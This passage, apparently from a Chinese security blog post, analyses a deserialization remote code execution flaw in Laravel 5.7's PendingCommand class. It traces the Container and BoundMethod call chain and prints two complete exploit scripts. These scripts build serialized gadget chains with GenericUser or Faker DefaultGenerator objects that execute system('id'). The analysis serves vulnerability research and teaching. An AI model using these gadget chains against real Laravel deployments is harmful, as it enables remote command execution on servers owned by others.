+<li><p>在<code>getConcrete（）</code>方法中出了问题，导致可以利用 php 的反射机制实例化任意类。在 <code>getConcrete()</code> 方法中，判断 <code>$this-&gt;bindings[$abstract])</code> 是否存在，若存在则返回 <code>$this-&gt;bindings[$abstract][&#39;concrete&#39;]</code> 。<code>bindings</code> 是 <code>Container.php</code> 中 <code>Container</code> 类的属性，因此我们只需要找到一个继承自  <code>Container</code> 的类，就可以通过反序列化控制 <code>$this-&gt;bindings</code> 属性。<code>Illuminate\Foundation\Application</code> 继承自 <code>Container</code> 类。<code>$abstract</code> 为<code>Illuminate\Contracts\Console\Kernel</code> ，只需通过反序列化定义 <code>Illuminate\Foundation\Application</code> 的 <code>$bindings</code> 属性存在键名为 <code>Illuminate\Contracts\Console\Kernel</code> 的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是 <code>Illuminate\Foundation\Application</code> 类。</p>
+</li>
+<li><p>在实例化 <code>Application类</code> 的时候， 要满足 <code>isBuildable()</code> 才可以进行 <code>build</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isBuildable</span><span class="params">($concrete, $abstract)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $concrete === $abstract || $concrete <span class="keyword">instanceof</span> Closure;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时明显不满足条件，所以接着执行 <code>$object = $this-&gt;make($concrete);</code> ，在 <code>make()</code> 函数中成功将 <code>$abstract</code> 重新赋值为 <code>Illuminate\Foundation\Application</code>，从而成功绕过 <code>isBuildable()</code> 函数，进入 <code>$this-&gt;build</code> 方法，就能看到使用<code>ReflectionClass</code>反射机制，实例化我们传入的类。</p>
+</li>
+<li><p>在返回一个 <code>Illuminate\Foundation\Application</code> 对象之后，<code>exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code> 又调用了 <code>call()</code> 方法，由于 <code>Illuminate\Foundation\Application</code> 没有 <code>call()</code> 方法，所以会调用父类 <code>Illuminate\Container\Container</code> 的 <code>call()</code> 方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> BoundMethod::call(<span class="keyword">$this</span>, $callback, $parameters, $defaultMethod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>跟进 <code>BoundMethod::call()</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($container, $callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static</span>::isCallableWithAtSign($callback) || $defaultMethod) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::callClass($container, $callback, $parameters, $defaultMethod);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">            $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>isCallableWithAtSign()</code> 处判断回调函数是否为字符串并且其中含有 <code>@</code> ，并且 <code>$defaultMethod</code> 默认为 null，很明显不满足条件，进入 <code>callBoundMethod()</code> ，该函数只是判断 <code>$callback</code> 是否为数组。后面的匿名函数直接调用 <code>call_user_func_array()</code> ，并且第一个参数我们可控，参数值为 <code>system</code> ，第二个参数由 <code>getMethodDependencies()</code> 方法返回。跟进 <code>getMethodDependencies()</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getMethodDependencies</span><span class="params">($container, $callback, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dependencies = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">static</span>::getCallReflector($callback)-&gt;getParameters() <span class="keyword">as</span> $parameter) &#123;</span><br><span class="line">        <span class="keyword">static</span>::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array_merge($dependencies, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>getCallReflector()</code> 用于反射获取 <code>$callback</code> 的对象， 然后执行 <code>addDependencyForCallParameter()</code> 为 <code>$callback</code> 的对象添加一些参数，最后将我们传入的 <code>$parameters</code> 数组和 <code>$dependencies</code> 数组合并， <code>$dependencies</code> 数组为空。最后相当于执行了 <code>call_user_func_array(&#39;system&#39;,array(&#39;id&#39;))</code></p>
+</li>
+<li><p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">		<span class="keyword">protected</span> $parameters;</span><br><span class="line">		<span class="keyword">protected</span> $app;</span><br><span class="line">		<span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">		<span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// chain.php</span></span><br><span class="line">$genericuser = <span class="keyword">new</span> Illuminate\Auth\GenericUser(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">        <span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$application = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span></span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$exp = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">    <span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'id'</span>),</span><br><span class="line">    $genericuser,</span><br><span class="line">    $application</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用栈分析 : </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Foundation\Testing\PendingCommand-&gt;__destruct()</span><br><span class="line">	$test = Illuminate\Auth\GenericUser</span><br><span class="line">		attributes = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),</span><br><span class="line">			<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)</span><br><span class="line">		)</span><br><span class="line">	$app = Illuminate\Foundation\Application</span><br><span class="line">		<span class="keyword">array</span>(</span><br><span class="line">			<span class="string">"Illuminate\Contracts\Console\Kernel"</span> =&gt; </span><br><span class="line">			<span class="keyword">array</span>(</span><br><span class="line">				<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)</span><br><span class="line">			)</span><br><span class="line">		)</span><br><span class="line">	$command = <span class="string">"system"</span></span><br><span class="line">	$parameters = <span class="keyword">array</span>(<span class="string">"id"</span>)</span><br><span class="line"></span><br><span class="line">Illuminate\Foundation\Testing\PendingCommand-&gt;run()</span><br><span class="line">	Illuminate\Foundation\Testing\PendingCommand-&gt;mockConsoleOutput()</span><br><span class="line">		Illuminate\Foundation\Testing\PendingCommand-&gt;createABufferedOutputMock()</span><br><span class="line">		<span class="comment">// 在 foreach 中访问 expectedOutput 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法</span></span><br><span class="line">			Illuminate\Auth\GenericUser-&gt;__get()</span><br><span class="line">			<span class="comment">// return attributes["expectedOutput"]</span></span><br><span class="line">			<span class="comment">// return array("0"=&gt;"1")</span></span><br><span class="line">	<span class="comment">// 在 foreach 中访问 expectedQuestions 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法</span></span><br><span class="line">		Illuminate\Auth\GenericUser-&gt;__get()</span><br><span class="line">		<span class="comment">// return attributes["expectedQuestions"]</span></span><br><span class="line">		<span class="comment">// return array("0"=&gt;"1")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Application 继承了 Container 所以这相当于执行父类的 offsetGet()</span></span><br><span class="line">Illuminate\Foundation\Application-&gt;offsetGet()</span><br><span class="line">	<span class="comment">// key : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">	Illuminate\Foundation\Application-&gt;make()</span><br><span class="line">	<span class="comment">// abstract : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">	Illuminate\Foundation\Application-&gt;make()</span><br><span class="line">	<span class="comment">// abstract : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">		Illuminate\Foundation\Application-&gt;resolve()</span><br><span class="line">		<span class="comment">// abstract : Illuminate\Contracts\Console\Kernel</span></span><br><span class="line">			Illuminate\Foundation\Application-&gt;getConcrete()</span><br><span class="line">			<span class="comment">// $this-&gt;bindings[$abstract]['concrete'] : Illuminate\Foundation\Application</span></span><br><span class="line">			</span><br><span class="line">Illuminate\Foundation\Application-&gt;call()</span><br><span class="line">	Illuminate\Container\BoundMethod-&gt;call()</span><br><span class="line">		Illuminate\Container\BoundMethod-&gt;getMethodDependencies()</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h1 id="第二种漏洞分析"><a href="#第二种漏洞分析" class="headerlink" title="第二种漏洞分析"></a>第二种漏洞分析</h1><ul>
+<li><p>同样的，在 <code>PendingCommand</code> 类的 <code>mockConsoleOutput()</code> 函数处，去触发 <code>__get()</code> 方法构造 pop 链，这里选择 <code>Faker\DefaultGenerator</code> 类，其 <code>__get()</code> 方法如下 : </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>同样的方法绕过 <code>mockConsoleOutput()</code> 函数，运行到 <code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code> 处。只不过这次的关注点在于 <code>resolve()</code> 函数的 <code>$this-&gt;instances[$abstract]</code> 处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">($abstract, $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line">    $needsContextualBuild = ! <span class="keyword">empty</span>($parameters) || ! is_null(<span class="keyword">$this</span>-&gt;getContextualConcrete($abstract));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="comment">// 在这里返回一个可控的实例化对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;instances[$abstract];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;with[] = $parameters;</span><br><span class="line">    $concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">        $object = $extender($object, <span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;resolved[$abstract] = <span class="keyword">true</span>;</span><br><span class="line">    array_pop(<span class="keyword">$this</span>-&gt;with);</span><br><span class="line">    <span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>instances</code> 是 <code>Container.php</code> 中 <code>Container</code> 类的属性。因此我们只需要找到一个继承自  <code>Container</code> 的类，就可以通过反序列化控制 <code>$this-&gt;instances</code> 属性。<code>Illuminate\Foundation\Application</code> 继承自 <code>Container</code> 类。<code>$abstract</code> 为<code>Illuminate\Contracts\Console\Kernel</code> ，只需通过反序列化定义 <code>Illuminate\Foundation\Application</code> 的 <code>$instances</code> 属性存在键名为 <code>Illuminate\Contracts\Console\Kernel</code> 的数组就能返回我们要实例化的类名。在这里返回的是 <code>Illuminate\Foundation\Application</code> 类。</p>
+</li>
+<li><p>其余的就和第一种相同了，不同点在于构造可控实例化对象的方法不同</p>
+</li>
+<li><p>exp : </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instance)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">"Illuminate\Contracts\Console\Kernel"</span>] = $instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// chain.php</span></span><br><span class="line">$defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>)));</span><br><span class="line">$app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">$application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">$pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'id'</span>), $defaultgenerator, $application);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><ul>
+<li>代码调试的技巧</li>
+<li>函数调用栈的分析</li>
+<li>可控点的寻找</li>
+</ul>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a href="https://xz.aliyun.com/t/5483" target="_blank" rel="noopener">https://xz.aliyun.com/t/5483</a></li>
+<li><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a></li>
+<li><a href="https://www.jianshu.com/p/438a95046403" target="_blank" rel="noopener">https://www.jianshu.com/p/438a95046403</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+            <a href="/tags/Laravel/" rel="tag"><i class="fa fa-tag"></i> Laravel</a>
+          
+            <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/10/De1CTF web ssrf_me 的三种方法/" rel="next" title="De1CTF web ssrf_me 的三种方法">
+                <i class="fa fa-chevron-left"></i> De1CTF web ssrf_me 的三种方法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
+            
+              <p class="site-author-name" itemprop="name">peri0d</p>
+              <p class="site-description motion-element" itemprop="description">待我尝尽世间甘苦，便喂你一勺甜。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
